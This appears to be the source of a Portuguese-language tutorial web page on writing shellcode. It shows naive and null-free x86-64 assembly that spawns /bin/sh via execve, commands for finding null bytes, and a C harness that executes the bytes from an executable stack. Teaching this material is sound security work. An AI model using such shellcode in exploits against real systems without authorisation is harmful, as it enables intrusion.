import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function Shellcoding() {
  return (
    <PageContainer title="Shellcoding" subtitle="Escrever shellcode compact e null-free em Assembly" difficulty="expert" timeToRead="20 min">
      <AlertBox type="danger" title="Uso Educacional">
        Shellcoding é uma técnica de segurança ofensiva. Use apenas em CTF, pesquisa de vulnerabilidades em sistemas próprios, ou pentesting com autorização explícita.
      </AlertBox>

      <p><strong>Shellcode</strong> é código de máquina autocontido que executa uma ação específica quando injetado em um processo vulnerável. O nome vem do objetivo clássico: abrir um shell (<code>/bin/sh</code>).</p>

      <h2>Requisitos do Shellcode</h2>
      <ul>
        <li><strong>Posição independente:</strong> Funciona em qualquer endereço de memória</li>
        <li><strong>Null-free:</strong> Sem bytes 0x00 (strings C terminam com null, cortando o shellcode)</li>
        <li><strong>Compacto:</strong> O menor possível</li>
        <li><strong>Autocontido:</strong> Não depende de endereços externos</li>
      </ul>

      <h2>Shell Simples em Assembly</h2>
      <CodeBlock language="nasm" filename="shell_naive.asm" code={`; VERSÃO INGÊNUA — com nulls (não funciona em exploits de string):
section .text
    global _start

_start:
    ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
    mov rax, 59             ; syscall: execve (CONTÉM NULL! 0x00)
    lea rdi, [shell]        ; "/bin/sh"
    lea rsi, [args]         ; argv
    xor rdx, rdx            ; envp = NULL
    syscall

section .data
    shell db "/bin/sh", 0
    args  dq shell, 0

; PROBLEMA: "mov rax, 59" gera bytes: 48 B8 3B 00 00 00 00 00 00 00
;           Os zeros (0x00) vão truncar a string se injetado via strcpy!`} />

      <h2>Shellcode Null-Free</h2>
      <CodeBlock language="nasm" filename="shell_nullfree.asm" code={`; VERSÃO NULL-FREE — técnicas para evitar bytes 0x00:
; Compilar como shellcode bruto: nasm -f bin shell.asm -o shell.bin

bits 64

_start:
    ; Zerar registradores SEM zeros no código:
    xor rax, rax            ; rax = 0 (gerado como: 48 31 C0 — sem nulls)
    cdq                     ; rdx = sign_extend(eax) = 0 (se rax=0)
    
    ; Construir "/bin/sh" na stack:
    ; "/bin/sh\0" em big-endian = 0x2F62696E2F736800
    ; Mas o byte \0 no final é problemático!
    ; Truque: usar "/bin//sh" (mesmo resultado, sem null no código)
    push rax                ; push null terminator (mas rax=0 já é null!)
    ; Alternativa: usar MOVABS com valor que não termina em 0x00:
    mov rbx, 0x68732F2F6E69622F  ; "/bin//sh" reversed (little-endian)
    push rbx                ; push "/bin//sh\0" (null já está pelo push rax)
    
    mov rdi, rsp            ; rdi = &"/bin//sh"
    
    ; argv = ["/bin//sh", NULL]:
    push rax                ; NULL (segundo elemento)
    push rdi                ; ponteiro para "/bin//sh"
    mov rsi, rsp            ; rsi = argv
    
    ; execve("/bin//sh", argv, NULL):
    push 59                 ; não gera null se usarmos 'push imm8'
    pop rax                 ; rax = 59 (sem nulls no opcode!)
    ; xor rdx, rdx já foi feito com cdq
    syscall`} />

      <h2>Técnicas Anti-Null</h2>
      <CodeBlock language="bash" code={`# Verificar shellcode por bytes null:
nasm -f bin shell.asm -o shell.bin
xxd shell.bin | grep "00"      # procura bytes null
objdump -d shell.bin | grep -E "0[[:space:]]*$"  # procura nulls

# Técnicas para evitar null:
# 1. XOR em vez de MOV para zerar: xor rax, rax vs mov rax, 0
# 2. PUSH imm8 + POP: push 59; pop rax  vs  mov rax, 59
# 3. CDQ para zerar RDX: se eax=0, cdq seta rdx=0
# 4. Strings XOR'd: XOR a string com chave e decode em runtime`} />

      <h2>Testando Shellcode em C</h2>
      <CodeBlock language="c" filename="test_shellcode.c" code={`// Extrair shellcode e testar:
// 1. nasm -f bin shell.asm -o shell.bin
// 2. xxd -i shell.bin    <- gera array C
// 3. compilar e executar

#include <stdio.h>
#include <string.h>

// Cole o output do 'xxd -i shell.bin' aqui:
unsigned char shellcode[] = {
    0x48, 0x31, 0xc0, 0x99, 0x50, 0x48, 0xbb, 0x2f,
    0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x53,
    /* ... */
};
unsigned int shellcode_len = sizeof(shellcode);

int main() {
    printf("Tamanho do shellcode: %d bytes\\n", shellcode_len);
    
    // Executar shellcode como função:
    // (requer stack executável: gcc -z execstack)
    void (*func)() = (void(*)())shellcode;
    func();
    
    return 0;
}

// Compilar:
// gcc -z execstack -fno-stack-protector test_shellcode.c -o test_shellcode
// APENAS EM LABORATÓRIO!`} />
    </PageContainer>
  );
}
